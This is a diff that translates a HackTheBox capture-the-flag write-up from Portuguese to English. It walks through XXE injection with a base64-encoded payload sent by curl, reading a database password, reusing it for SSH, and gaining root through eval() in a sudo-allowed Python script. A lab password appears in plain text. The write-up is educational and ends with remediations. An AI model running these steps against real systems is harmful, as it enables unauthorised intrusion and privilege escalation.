@@ -5,11 +5,11 @@ categories: [Machines, HackTheBox]
 tags: [hackthebox, linux, xxe, lfi, php-filter, eval, sudo, privesc, easy]
 ---
 
-**IP:** 10.129.95.166 | **Dificuldade:** Easy | **OS:** Linux (Ubuntu 20.04) | **Autor:** ejedev
+**IP:** 10.129.95.166 | **Difficulty:** Easy | **OS:** Linux (Ubuntu 20.04) | **Author:** ejedev
 
-## Resumo
+## Summary
 
-Máquina focada em XXE injection e code review. O formulário de bug bounty envia XML codificado em base64, vulnerável a XXE. Usando PHP filters lemos `db.php` e obtemos credenciais para SSH. A escalada explora um script Python com `eval()` que pode ser executado como root via sudo.
+Machine focused on XXE injection and code review. The bug bounty form sends base64-encoded XML, vulnerable to XXE. Using PHP filters we read `db.php` and obtain SSH credentials. Privilege escalation abuses a Python script with `eval()` that can be run as root via sudo.
 
 | Flag | Hash |
 |------|------|
@@ -18,7 +18,7 @@ Máquina focada em XXE injection e code review. O formulário de bug bounty envi
 
 ---
 
-## 1. Reconhecimento
+## 1. Reconnaissance
 
 ```bash
 nmap -sV -sC -T4 -Pn 10.129.95.166
@@ -32,19 +32,19 @@ PORT   STATE SERVICE VERSION
 
 ---
 
-## 2. Enumeração Web
+## 2. Web Enumeration
 
 ```bash
 ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/common.txt \
      -u http://10.129.95.166/FUZZ -mc 200,301
 ```
 
-`/resources/README.txt` revela:
+`/resources/README.txt` leaks:
 ```
 [ ] Disable 'test' account on portal and switch to hashed password.
 ```
 
-O formulário `log_submit.php` envia POST para `/tracker_diRbPr00f314.php` com campo `data` = XML codificado em base64+URL. O XML tem a estrutura:
+The `log_submit.php` form POSTs to `/tracker_diRbPr00f314.php` with a `data` field = XML encoded as base64+URL. The XML structure:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -55,7 +55,7 @@ O formulário `log_submit.php` envia POST para `/tracker_diRbPr00f314.php` com c
 
 ---
 
-## 3. XXE Injection → Leitura do db.php
+## 3. XXE Injection → Read db.php
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -68,12 +68,12 @@ O formulário `log_submit.php` envia POST para `/tracker_diRbPr00f314.php` com c
 ```
 
 ```bash
-XML='...'  # payload acima
+XML='...'  # payload above
 PAYLOAD=$(printf '%s' "$XML" | base64 -w 0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))")
 curl -s -X POST http://10.129.95.166/tracker_diRbPr00f314.php -d "data=$PAYLOAD"
 ```
 
-Conteúdo de `db.php` após decodificar base64:
+After base64-decoding the response:
 
 ```php
 $dbpassword = "m19RoAU0hP41A1sTsq6K";
@@ -81,9 +81,9 @@ $dbpassword = "m19RoAU0hP41A1sTsq6K";
 
 ---
 
-## 4. Foothold — SSH como development
+## 4. Foothold — SSH as development
 
-Senha reutilizada no usuário `development`:
+Password reused on the `development` user:
 
 ```bash
 ssh development@10.129.95.166
@@ -94,24 +94,24 @@ cat ~/user.txt
 
 ---
 
-## 5. Escalada de Privilégios — eval() no ticketValidator.py
+## 5. Privilege Escalation — eval() in ticketValidator.py
 
 ```bash
 sudo -l
 # (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 ```
 
-O script lê um arquivo `.md` e executa `eval()` no campo `__Ticket Code__`:
+The script reads a `.md` file and calls `eval()` on the `__Ticket Code__` field:
 
 ```python
 validationNumber = eval(x.replace("**", ""))
 ```
 
-**Condições:** linha começa com `**`, `int(ticketCode) % 7 == 4`, `validationNumber > 100`.
+**Conditions:** line starts with `**`, `int(ticketCode) % 7 == 4`, `validationNumber > 100`.
 
-Fórmula: `7*25+4 = 179`, então `179 % 7 = 4 ✓`
+Formula: `7*25+4 = 179`, so `179 % 7 = 4 ✓`
 
-**Ticket malicioso `/tmp/f.md`:**
+**Malicious ticket `/tmp/f.md`:**
 
 ```markdown
 # Skytrain Inc
@@ -129,7 +129,7 @@ cat /root/root.txt
 
 ---
 
-## Diagrama
+## Attack Chain
 
 ```
 ffuf → /db.php, /resources/README.txt
@@ -142,11 +142,11 @@ ffuf → /db.php, /resources/README.txt
 
 ---
 
-## Lições Aprendidas
+## Lessons Learned
 
-| Vulnerabilidade | Remediação |
-|-----------------|------------|
-| XXE sem sanitização | Desabilitar external entities no parser XML |
-| Credenciais em arquivo PHP acessível via LFI | Usar variáveis de ambiente para secrets |
-| Reutilização de senha (DB → SSH) | Senhas únicas por serviço |
-| `eval()` em input controlável com sudo NOPASSWD | Nunca usar eval() em input do usuário |
+| Vulnerability | Remediation |
+|---------------|-------------|
+| XXE with no sanitization | Disable external entities in the XML parser |
+| Credentials in PHP file readable via LFI | Use environment variables for secrets |
+| Password reuse (DB → SSH) | Unique passwords per service |
+| `eval()` on user-controlled input with sudo NOPASSWD | Never use eval() on user input |
